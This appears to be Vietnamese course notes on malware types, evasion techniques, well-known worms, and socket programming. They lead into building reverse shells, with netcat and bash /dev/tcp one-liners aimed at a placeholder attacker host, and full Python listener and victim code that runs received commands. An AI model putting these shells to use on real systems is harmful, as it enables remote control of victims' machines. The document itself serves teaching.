# 1. Chương trình độc hại
Chương trình độc hại là những chương trình máy tính, có thể viết bằng ngôn ngữ biên dịch hoặc thông dịch, được viết nhằm phục vụ mục đích xấu.
## Hình thức lây nhiễm
- Tự lây lan bằng cách nhiễm độc vào một file hợp lệ, hoặc thông qua các thiết bị chia sẻ dữ liệu hoặc thông qua lỗ hổng bảo mật: virus, worm 
- Sử dụng Social Engineering, giả mạo là một chương trình không độc hại
- Tấn công vào credential yếu, credential được tái sử dụng, bị lộ lọt.

## Phương pháp qua mặt hệ thống bảo mật
- Dropper: Là một chương trình tải mã độc về máy.
- Fileless Malware: Thực thi mã độc trong memory để tránh scan file hoặc file forensics
- Hacktool: sử dụng các chương trình hợp lệ (ví dụ psexec) để threat actor thao túng hệ thống
- Packer / Crypter: Sử dụng các phương pháp mã hóa để che giấu đoạn mã độc trong file.
- Rootkit: Sử dụng kỹ thuật hooking để che giấu sự tồn tại trên hệ thống.

## Mục đích tấn công
- Điều khiển máy tính từ xa: Trojan, Backdoor, Virus, Worm
- Đánh cắp dữ liệu: Trojan, Spyware, Stealer, Keylogger
- Chiếm dụng tài nguyên trái phép: CoinMiner, Botnet
- Cài đặt các URL hoặc application, extension trái phép: Adware, PUP
- Phá hoại dữ liệu hoặc hệ thống hạ tầng: Destructor
=> Một phần mềm độc hại có thể bao gồm nhiều chức năng. Vì vậy, việc phân chia theo category chỉ mang tính chất tương đối.

## Vài thông tin thú vị
- [Samy Worm](https://en.wikipedia.org/wiki/Samy_(computer_worm)) do [Samy Kamkar](https://en.wikipedia.org/wiki/Samy_Kamkar) viết đã khai thác lỗ hổng Stored XSS trong nền tảng mạng xã hội MySpace. Chỉ sau 20 giờ, có hơn một triệu người dùng đã bị lây nhiễm.
- Virus [Conficker](https://en.wikipedia.org/wiki/Conficker) khai thác lỗ hổng [MS08-067](https://www.cve.org/CVERecord?id=CVE-2008-4250) trong dịch vụ SMB của Windows OS và sử phương thức tấn công brute force để lây nhiễm.
- Virus [Mirai](https://en.wikipedia.org/wiki/Mirai_(malware)) và các biến thể của nó tấn công các hệ thống máy chủ Linux, kể cả các thiết bị mạng chạy Linux, để tạo mạng lưới Botnet. Mirai và các biến thể sử dụng tấn công brute force vào dịch vụ SSH, kết hợp với các lỗ hổng trong dịch vụ quản trị của thiết bị mạng để lây lan. Mỗi biến thể sử dụng một số các exploit khác nhau.
- Worm [Stuxnet](https://en.wikipedia.org/wiki/Stuxnet) là một chương trình được thiết kế đặc biệt để tấn công vào những cá nhân và hệ thống công nghiệp thuộc chương trình hạt nhân của Iran. Stuxnet và các biến thể có độ phức tạp cao đến mức các chuyên gia phân tích mã độc thời đó đánh giá là "vũ khí mạng". Có thể tìm hiểu sâu hơn trong [Phim tài liệu Zero Days](https://www.imdb.com/title/tt5446858/) và quyển sách [Vũ khí hoàn hảo](https://www.amazon.com/Perfect-Weapon-Sabotage-Fear-Cyber/dp/0451497899)



## Reverse shell
Reverse Shell là chương trình cho phép:
- Máy nạn nhân tự kết nối ngược về máy Threat Actor.
- Threat actor điều khiển từ xa qua lệnh hệ thống.

Ví dụ: Reverse shell sử dụng netcat
1. Attacker mở kết nối port 4444: `nc -lvnp 4444`
2. Client (victim) kết nối đến port 4444: `nc attacker_ip 4444 -e /bin/bash`

<details>
<summary>Tại sao lại sử dụng Reverse Shell?</summary>

- Chương trình có thể cần được cho phép mới có thể mở port. Ví dụ: trên Windows, Windows Firewall sẽ hiện dialog hỏi người dùng có cho phép ứng dụng mở port không.
- Máy chủ có thể nằm trong một phân vùng mạng nội bộ, được NAT port ra ngoài. Vì vậy, việc mở port bên trong thành công không đồng nghĩa với việc threat actor có thể điều khiển từ xa được.
- Đối với những giải pháp kiểm soát outbound cơ bản, các giải pháp có thể chỉ hoạt động ở mức độ kiểm soát port outbound. Ví dụ: cho phép kết nối ra internet qua port 53 hoặc 80/443. Threat actor có thể lợi dụng chính sách này để thiết lập kết nối.
</details>

- Reverse shell có thể nằm trong những category nào của malware?
- Bind shell là gì? So sánh với Reverse Shell?

# 2. Socket Programming và sử dụng với Reverse Shell
## 2.1. Socket Programming cơ bản
Socket Programming là hình thức lập trình nhằm giao tiếp dữ liệu thông qua socket. Lập trình socket có thể dùng giao thức TCP hoặc UDP nằm ở tầng 4 mô hình OSI, hoặc sử dụng các giao thức đặc biệt hơn ví dụ Unix Domain Name Socket.

Quy trình chung:
1. Server bind một port trên một interface (hoặc sử dụng 0.0.0.0 cho toàn bộ interface) và listen.
2. Client kết nối đến server thông qua địa chỉ IP và port
3. Giao tiếp bằng việc gửi - nhận dữ liệu.
4. Kết thúc phiên kết nối, đóng kết nối (server vẫn có thể sử dụng port chứ không ngừng hẳn)

## Code demo: Socket programming
- Code phía server:

```
import socket

HOST = '127.0.0.1'  # Giao diện loopback tiêu chuẩn (localhost)
PORT = 9191         # Cổng để lắng nghe

# 1. Tạo socket (AF_INET cho IPv4, SOCK_STREAM cho TCP)
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 2. Gán socket với địa chỉ và cổng
server_socket.bind((HOST, PORT))

# 3. Bắt đầu lắng nghe kết nối đến (tối đa 1 kết nối đang chờ)
server_socket.listen(1)
print(f"[*] Server đang lắng nghe trên {HOST}:{PORT}")

# Chờ và chấp nhận kết nối từ client
conn, addr = server_socket.accept()
print(f"[*] Đã chấp nhận kết nối từ: {addr[0]}:{addr[1]}")

try:
    # Vòng lặp chính để nhận và xử lý dữ liệu
    while True:
        # Nhận dữ liệu (tối đa 1024 bytes)
        data = conn.recv(1024)
        if not data:
            # Client đóng kết nối
            print("[-] Client đã đóng kết nối.")
            break

        # Giải mã dữ liệu nhận được (từ bytes sang string)
        client_data = data.decode('utf-8')

        # In ra màn hình theo yêu cầu
        print(f"Client gửi: <{client_data}>")

        # (Tùy chọn) Gửi phản hồi lại client
        conn.sendall(f"Server đã nhận: {client_data}".encode('utf-8'))

except Exception as e:
    print(f"Lỗi xảy ra: {e}")
finally:
    # Đóng kết nối và socket
    conn.close()
    server_socket.close()
    print("[*] Server đã tắt.")

```
- Code phía client:
```
import socket

# Cấu hình Host và Port của Server
HOST = '127.0.0.1'  # Địa chỉ server
PORT = 9191         # Cổng server

# 1. Tạo socket (AF_INET cho IPv4, SOCK_STREAM cho TCP)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # 2. Kết nối đến Server
    client_socket.connect((HOST, PORT))
    print(f"[*] Đã kết nối đến Server {HOST}:{PORT}")

    # Vòng lặp chính để gửi dữ liệu
    while True:
        # Nhận input từ người dùng
        message = input("Nhập tin nhắn để gửi đến server (gõ 'quit' để thoát): ")
        
        if message.lower() == 'quit':
            break
        
        # Mã hóa và gửi dữ liệu đến server
        client_socket.sendall(message.encode('utf-8'))
        
        # (Tùy chọn) Nhận phản hồi từ server
        response = client_socket.recv(1024)
        print(f"Server phản hồi: {response.decode('utf-8')}")
        
except ConnectionRefusedError:
    print("Lỗi: Không thể kết nối. Hãy đảm bảo Server đang chạy.")
except Exception as e:
    print(f"Lỗi xảy ra: {e}")
finally:
    # Đóng socket
    client_socket.close()
    print("[*] Client đã tắt.")
```


<details>
<summary>Brainstorm: Khi đối chiếu Reverse Shell vào socket programming, đâu là client, dâu là server?</summary>

Trong reverse shell:

- Victim = client, khởi tạo kết nối.
- Threat actor = server, lắng nghe connection.
</details>

## Sử dụng socket programming để viết reverse shell
Ý tưởng:
- Phía server lấy input và gửi về phía client:
```
command = input("Shell> ")
conn.send(command.encode('utf-8') + b'\n')
```

- Phía client có thể sử dụng thư viện subprocess để thực thi lệnh hệ thống
```
import subprocess

output = subprocess.run(command, check=True)
```
Như vậy, bên phía client sẽ nhận lệnh, thực thi và gửi lại phía server kết quả
```
command = s.recv(1024).decode('utf-8').strip()
output = subprocess.run(command, check=True)
s.sendall(output.stdout)
```

<details>
<summary>Code phía server</summary>

```
import socket
import sys

# Cấu hình lắng nghe
LISTEN_HOST = '0.0.0.0' # Lắng nghe trên tất cả các giao diện
LISTEN_PORT = 9191      # Phải khớp với cổng trong reverse shell


def listener_server():
    # 1. Tạo socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Cho phép sử dụng lại địa chỉ/cổng ngay lập tức (tránh lỗi "Address already in use")
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 2. Gán và lắng nghe
    server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    server_socket.listen(1)
    print(f"[*] Server đang lắng nghe trên cổng {LISTEN_PORT}...")

    # 3. Chờ và chấp nhận kết nối
    conn, addr = server_socket.accept()
    print(f"[*] Reverse Shell đã kết nối từ: {addr[0]}:{addr[1]}")

    try:
        # Vòng lặp giao tiếp chính
        while True:
            # Nhận lệnh từ người dùng Attacker
            command = input("Shell> ")

            if command.lower() == 'exit':
                conn.send(b'exit\n') # Gửi lệnh exit đến shell (tùy thuộc shell)
                break

            if not command:
                continue

            # Gửi lệnh và thêm ký tự xuống dòng (cần cho shell)
            conn.send(command.encode('utf-8') + b'\n')
            # Nhận và in phản hồi từ Victim
            response = conn.recv(1024).decode('utf-8', errors='ignore')
            print(response)

    except Exception as e:
        print(f"\n[-] Mất kết nối hoặc lỗi xảy ra: {e}")
    finally:
        # Đóng kết nối
        conn.close()
        server_socket.close()
        print("[*] Server đã đóng.")

if __name__ == '__main__':
    listener_server()

```
</details>

Hãy viết code phía client và server

<details>
<summary>Code phía client</summary>

```
import socket
import subprocess


# Cấu hình máy Attacker (Server)
ATTACKER_HOST = '127.0.0.1'  # THAY ĐỔI: IP thực tế của máy Attacker
ATTACKER_PORT = 9191         # Cổng Attacker đang lắng nghe

def reverse_shell():
    # 1. Tạo và kết nối socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_HOST, ATTACKER_PORT))

    # Vòng lặp chính để nhận và thực thi lệnh
    while True:
        # 2. Nhận lệnh từ Server (Attacker)
        command = s.recv(1024).decode('utf-8').strip()

        if not command or command.lower() == 'exit':
            s.send(b"[!] Closing.\n")
            break # Thoát khỏi vòng lặp nhận lệnh

        # 3. Thực thi lệnh sử dụng subprocess.run, redirect std vào PIPE
        try:
            # Khởi tạo tiến trình con
            output = subprocess.run(
                command,
                check=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            # 4. Gửi stdout về server. output là 1 namespace có cả stderr, ...
            s.sendall(output.stdout)
        except Exception as e:
            s.send(f"[-] Error: {str(e)}".encode('utf-8'))

    # 5. Đóng socket và nghỉ trước khi kết nối lại
    s.close()

if __name__ == '__main__':
    reverse_shell()
```
</details>

# 3. Interactive Shell và Non-Interactive Shell
TODO: giải thích interactive và non interactive, kiểm chứng ví dụ
phân biệt:
- Interactive Có TTY, có prompt, hỗ trợ Ctrl+C, tab-complete, ...
- Non interactive: không có tính năng trên

Tạo interactive shell và non interactive shell
- Bash: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
- Python:
```
import socket, subprocess

s = socket.socket()
s.connect(("ATTACKER", 4445))

while True:
    cmd = s.recv(1024).decode()
    output = subprocess.getoutput(cmd)
    s.send(output.encode())

```
Ví dụ phân biệt:
- Giả sử chạy lệnh: `ls -lah /usr/bin/` -> non-interactive shell sẽ gửi toàn bộ -> bị cắt, vân vân. Interactive shell thì không bị (với directory to như system32 trên windows, interactive shell gửi hết data theo từng đoạn)
- Chạy `sudo su -`, non-interactive shell bị hang còn interactive shell hoạt động bt

Bài tập:
- Viết non-interactive shell với python nhưng xử lý vấn đề socket

## Nâng cấp non-interactive shell trên python:
```
import pty
pty.spawn("/bin/bash")
```
Tuy nhiên, sử dụng command line sẽ khác: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

Bài tập:
- Viết reverse shell với python nhưng sử có interactive shell
- Tìm, đọc và giải thích code interactive reverse shell trên C

